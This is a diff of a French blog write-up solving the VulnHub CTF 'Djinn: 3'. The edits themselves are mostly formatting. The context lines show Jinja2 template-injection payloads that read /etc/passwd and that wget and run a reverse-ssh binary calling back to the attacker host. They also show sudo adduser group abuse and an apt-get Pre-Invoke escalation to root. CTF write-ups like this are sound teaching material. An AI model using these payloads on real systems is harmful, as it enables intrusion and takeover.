@@ -3,7 +3,7 @@ title: "Solution du CTF Djinn: 3 de VulnHub"
 tags: [CTF, VulnHub]
 ---
 
-[djinn: 3](https://www.vulnhub.com/entry/djinn-3,492/) est un CTF de [mzfr](https://twitter.com/0xmzfr) proposé sur VulnHub.  Il y a deux autres opus dans cette série.
+[djinn: 3](https://www.vulnhub.com/entry/djinn-3,492/) est un CTF de [mzfr](https://twitter.com/0xmzfr) proposé sur VulnHub. Il y a deux autres opus dans cette série.
 
 ```
 Nmap scan report for 192.168.242.132
@@ -64,7 +64,7 @@ On a un service custom sur le port 31337. Visiblement c'est du Python car Nmap a
 
 C'est une simple erreur de décodage, on peut le reproduire facilement :
 
-```bash
+```console
 $ echo -e "\xff\x7f\x00" | ncat 192.168.242.132 31337
 username> Traceback (most recent call last):
   File "/opt/.tick-serv/tickets.py", line 105, in <module>
@@ -76,7 +76,7 @@ username> Traceback (most recent call last):
 UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte
 ```
 
-Ca nous donne quelques indications mais rien de vraiment utile. Le serveur demande aussi un champ password qui est sujet au même bug.
+Ça nous donne quelques indications mais rien de vraiment utile. Le serveur demande aussi un champ password qui est sujet au même bug.
 
 Sur le port 5000 il y a comme un bugtracker fait maison. On trouve notemment cette issue :
 
@@ -84,7 +84,8 @@ Sur le port 5000 il y a comme un bugtracker fait maison. On trouve notemment cet
 
 Effectivement l'accès fonctionne. Le serveur permet de soumettre les tickets, le résultat est alors aussitôt visible sur l'appli web. J'ai testé quelques payloads classiques avant de tester l'injection de templates (STTI) :
 
-```bash
+{% raw %}
+```console
 $ ncat 192.168.242.132 31337 -v
 Ncat: Version 7.93 ( https://nmap.org/ncat )
 Ncat: Connected to 192.168.242.132:31337.
@@ -120,6 +121,7 @@ Description: desc`id`
 Title: {{ 5 + 7 }}   
 Description: {{ 6 + 8 }}
 ```
+{% endraw %}
 
 Sur le listing des tickets tout semble correct mais en affichant les détails pour le dernier ticket soumis je vois que le code Python a été interprété :
 
@@ -140,9 +142,11 @@ Bien sûr [HackTricks a un article pour les STTI Jinja2](https://book.hacktricks
 
 Je scrolle à la recherche d'un exemple de STTI pas trop compliqué (qui ne nécessite pas trop d'introspection sur les objets présents) et je trouve une section qui fait mon bonheur :
 
+{% raw %}
 ```python
 {{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
+{% endraw %}
 
 Nouveau ticket, affichage dans l'appli web et hop !
 
@@ -156,19 +160,23 @@ mzfr:x:1002:1004:,,,:/home/mzfr:/bin/bash
 
 On va le récupérer notre reverse shell :
 
+{% raw %}
 ```python
 {{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cd /tmp;wget http://192.168.242.1/reverse-sshx64 -O reverse-sshx64;chmod 755 reverse-sshx64;").read() }}
 ```
+{% endraw %}
 
 et c'est parti :
 
+{% raw %}
 ```python
 {{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("nohup /tmp/reverse-sshx64 -p 80 192.168.242.1&").read() }}
 ```
+{% endraw %}
 
 Tunnel établit, plus qu'à se connecter via ssh sur le port 8888 de localhost.
 
-```bash
+```console
 $ sudo ./reverse-sshx64 -l -p 80 -v
 2022/11/22 09:31:11 Starting ssh server on :80
 2022/11/22 09:31:11 Success: listening on [::]:80
@@ -260,7 +268,7 @@ Pour m'en convrainvre j'ai uploadé et exécuté [pspy: Monitor linux processes 
 
 On ne peut pas accéder au code de `syncer.py` mais l'utilisateur a aussi deux fichiers Python compilés sur le disque et on a un accès en lecture :
 
-```bash
+```console
 www-data@djinn3:/tmp$ find / -user saint 2> /dev/null 
 /home/saint
 /opt/.configuration.cpython-38.pyc
@@ -271,7 +279,7 @@ L'appli de référence pour décompiler le Python c'est `uncompyle6` seulement l
 
 La VM du CTF utilise Python 3.6.9, j'ai choisis de faire tourner un Docker avec une version similaire et d'y installer `uncompyle6`. Avec l'option `-v` de Docker je m'assure que les fichiers compilés soient montés dans le container (ça évite de devoir transférer les fichiers par le réseau à la place) :
 
-```bash
+```console
 docker run -v /tmp/opt/:/opt -it --rm python:3.6 /bin/bash
 root@b26a32f45184:/# pip install uncompyle6
 Collecting uncompyle6
@@ -389,7 +397,7 @@ J'ai fait tourner `python -m http.server` sur la VM pour servir le fichier comme
 
 Une fois la tache cron exécutée je peux me connecter avec le compte `saint` :
 
-```bash
+```console
 saint@djinn3:~$ sudo -l
 Matching Defaults entries for saint on djinn3:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -402,11 +410,11 @@ Il y a une permission `sudo` pour rajouter un utilisateur. La ligne de commande 
 
 Ma première idée a été de créer un utilisateur dans le groupe `root` en me disant que je parviendrais à en tirer quelque chose :
 
-```bash
+```console
 sudo /usr/sbin/adduser --gid 0 --home /root --shell /bin/bash devloop
 ```
 
-En effet c'est suffisant pour lire le contenu de `/etc/sudoers` :
+En effet, c'est suffisant pour lire le contenu de `/etc/sudoers` :
 
 ```
 saint ALL=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
@@ -417,7 +425,7 @@ On découvre qu'un utilisateur nommé `jason` (qui n'existe plus sur le système
 
 Une fois l'utilisateur jason créé on peut utiliser un [GTFObin](https://gtfobins.github.io/gtfobins/apt-get/) pour la commande :
 
-```bash
+```console
 jason@djinn3:/home/saint$ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 # id
 uid=0(root) gid=0(root) groups=0(root)
@@ -455,7 +463,7 @@ so I can continue to make these kind of challenges.
 
 Une solution alternative pourrait être de créer un utilisateur membre du groupe `shadow` afin de lire les mots de passe du système :
 
-```bash
+```console
 saint@djinn3:~$ cat /etc/group | grep shadow
 shadow:x:42:
 saint@djinn3:~$ sudo /usr/sbin/adduser --gid 42 --shell /bin/bash shadow
